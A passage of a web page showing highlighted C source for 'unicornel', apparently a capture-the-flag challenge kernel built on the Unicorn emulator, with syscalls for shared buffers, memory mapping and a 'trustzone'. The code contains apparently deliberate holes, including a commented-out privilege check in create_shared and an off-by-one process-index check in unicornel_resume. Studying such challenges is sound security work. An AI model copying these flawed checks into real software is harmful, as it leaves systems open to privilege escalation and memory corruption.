</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;poll.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;unicorn/unicorn.h&#34;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;unicornel.h&#34;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define PAGE_SHIFT      12
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PAGE_SIZE       (1UL &lt;&lt; PAGE_SHIFT)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PAGE_MASK       (~(PAGE_SIZE-1))
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define PAGE_ALIGN(addr)        (((addr)+PAGE_SIZE-1)&amp;PAGE_MASK)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define TRUSTED_SYSCALL if(!current-&gt;trustzone_mode) return -0xff
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* I&#39;m reusing MAX_PROCESSES here, but there&#39;s not a 1:1 mapping of shared buffers to processes.
</span></span></span><span class="line"><span class="cl"><span class="cm"> * a process can create multiple shared mappings */</span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">shared_buffer</span> <span class="n">shared_buffers</span><span class="p">[</span><span class="n">MAX_PROCESSES</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">create_shared</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// TRUSTED_SYSCALL;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">length</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">length</span> <span class="o">&gt;</span> <span class="mh">0x10000</span> <span class="o">||</span> <span class="o">!</span><span class="n">length</span> <span class="o">||</span> <span class="n">length</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>            
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//Find an empty shared buffer handle
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">handle</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="n">handle</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">handle</span> <span class="o">&lt;</span> <span class="n">MAX_PROCESSES</span><span class="p">;</span> <span class="n">handle</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">shared_buffers</span><span class="p">[</span><span class="n">handle</span><span class="p">].</span><span class="n">refs</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">handle</span> <span class="o">==</span> <span class="n">MAX_PROCESSES</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span><span class="o">*</span> <span class="n">buffer</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">buffer</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">shared_buffers</span><span class="p">[</span><span class="n">handle</span><span class="p">].</span><span class="n">refs</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">shared_buffers</span><span class="p">[</span><span class="n">handle</span><span class="p">].</span><span class="n">buffer</span> <span class="o">=</span> <span class="n">buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">shared_buffers</span><span class="p">[</span><span class="n">handle</span><span class="p">].</span><span class="n">length</span> <span class="o">=</span> <span class="n">length</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">handle</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">validate_handle</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">TRUSTED_SYSCALL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">handle</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">length</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">handle</span> <span class="o">&gt;=</span> <span class="n">MAX_PROCESSES</span> <span class="o">||</span> <span class="o">!</span><span class="n">shared_buffers</span><span class="p">[</span><span class="n">handle</span><span class="p">].</span><span class="n">refs</span> <span class="o">||</span> <span class="n">shared_buffers</span><span class="p">[</span><span class="n">handle</span><span class="p">].</span><span class="n">length</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span> <span class="n">shared_buffers</span><span class="p">[</span><span class="n">handle</span><span class="p">].</span><span class="n">buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">map_address</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">TRUSTED_SYSCALL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">addr</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">length</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">void</span><span class="o">*</span> <span class="n">buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&#34;Mapping %p @ %p length %lu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">buffer</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="n">length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">uc_err</span> <span class="n">e</span> <span class="o">=</span> <span class="nf">uc_mem_map_ptr</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="n">length</span><span class="p">,</span><span class="n">UC_PROT_ALL</span><span class="p">,</span><span class="n">buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">e</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">bool</span> <span class="nf">overlaps_tz</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">,</span><span class="kt">long</span> <span class="n">src</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">n</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">trusted_zone_hook</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">src</span> <span class="o">+</span> <span class="n">n</span> <span class="o">&lt;=</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone</span> <span class="o">||</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone</span> <span class="o">+</span> <span class="nf">PAGE_ALIGN</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">tz_size</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">src</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">uc_err</span> <span class="nf">safe_read</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">dst</span><span class="p">,</span> <span class="kt">long</span> <span class="n">src</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">n</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">overlaps_tz</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="n">src</span><span class="p">,</span><span class="n">n</span><span class="p">))</span> <span class="n">TRUSTED_SYSCALL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">uc_mem_read</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">src</span><span class="p">,</span><span class="n">dst</span><span class="p">,</span><span class="n">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">uc_err</span> <span class="nf">strncpy_user</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">dst</span><span class="p">,</span> <span class="kt">long</span> <span class="n">src</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">n</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">uc_err</span> <span class="n">e</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">overlaps_tz</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="n">src</span><span class="p">,</span><span class="n">n</span><span class="p">))</span> <span class="n">TRUSTED_SYSCALL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">e</span> <span class="o">=</span> <span class="nf">uc_mem_read</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">src</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="n">dst</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">e</span> <span class="o">!=</span> <span class="n">UC_ERR_OK</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">e</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">dst</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">UC_ERR_OK</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">dst</span><span class="p">[</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">UC_ERR_OK</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">unicornel_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pointer</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">length</span> <span class="o">=</span>  <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">buffer</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">buffer</span><span class="p">)</span> <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uc_err</span> <span class="n">err</span> <span class="o">=</span> <span class="nf">safe_read</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="n">buffer</span><span class="p">,</span><span class="n">pointer</span><span class="p">,</span><span class="n">length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">err</span> <span class="o">!=</span> <span class="n">UC_ERR_OK</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">ret</span> <span class="o">=</span> <span class="nf">write</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">outfd</span><span class="p">,</span><span class="n">buffer</span><span class="p">,</span><span class="n">length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">//You&#39;re welcome
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">long</span> <span class="nf">print_integer</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">dprintf</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">outfd</span><span class="p">,</span><span class="s">&#34;%ld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">1</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">//Also called when the trustzone returns
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">long</span> <span class="nf">unicornel_exit</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">uc_emu_stop</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">unicornel_pause</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">current</span><span class="o">-&gt;</span><span class="n">paused</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">paused</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">unicornel_resume</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pid</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_mutex_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">pid</span> <span class="o">&gt;</span> <span class="n">MAX_PROCESSES</span> <span class="o">||</span> <span class="o">!</span><span class="n">processes</span><span class="p">[</span><span class="n">pid</span><span class="p">]</span> <span class="o">||</span> <span class="o">!</span><span class="n">processes</span><span class="p">[</span><span class="n">pid</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">paused</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">processes</span><span class="p">[</span><span class="n">pid</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">paused</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">//The trustzone is allowed to access trusted memory, no one else is.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">void</span> <span class="nf">trusted_read</span><span class="p">(</span><span class="n">uc_engine</span> <span class="o">*</span><span class="n">uc</span><span class="p">,</span> <span class="n">uc_mem_type</span> <span class="n">type</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">address</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">,</span> <span class="kt">int64_t</span> <span class="n">value</span><span class="p">,</span> <span class="kt">void</span><span class="o">*</span> <span class="n">user_data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span> <span class="o">=</span> <span class="n">user_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&#34;TRUSTED READ: %p %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">address</span><span class="p">,</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trustzone_mode</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//Untrusted code tried to access trusted memory, abort the malicious process
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Unprivileged access to trustzone attempted! Killing process</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">uc_emu_stop</span><span class="p">(</span><span class="n">uc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">memprot</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">TRUSTED_SYSCALL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">addr</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">length</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">prot</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">uc_mem_protect</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">addr</span><span class="p">,</span><span class="n">length</span><span class="p">,</span><span class="n">prot</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">create_trustzone</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">trusted_zone_hook</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uc_engine</span><span class="o">*</span> <span class="n">uc</span> <span class="o">=</span> <span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">addr</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">filename_user</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">128</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">uc_err</span> <span class="n">err</span> <span class="o">=</span> <span class="nf">strncpy_user</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="n">filename</span><span class="p">,</span><span class="n">filename_user</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">filename</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">err</span> <span class="o">!=</span> <span class="n">UC_ERR_OK</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed to copy string from address %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">filename_user</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
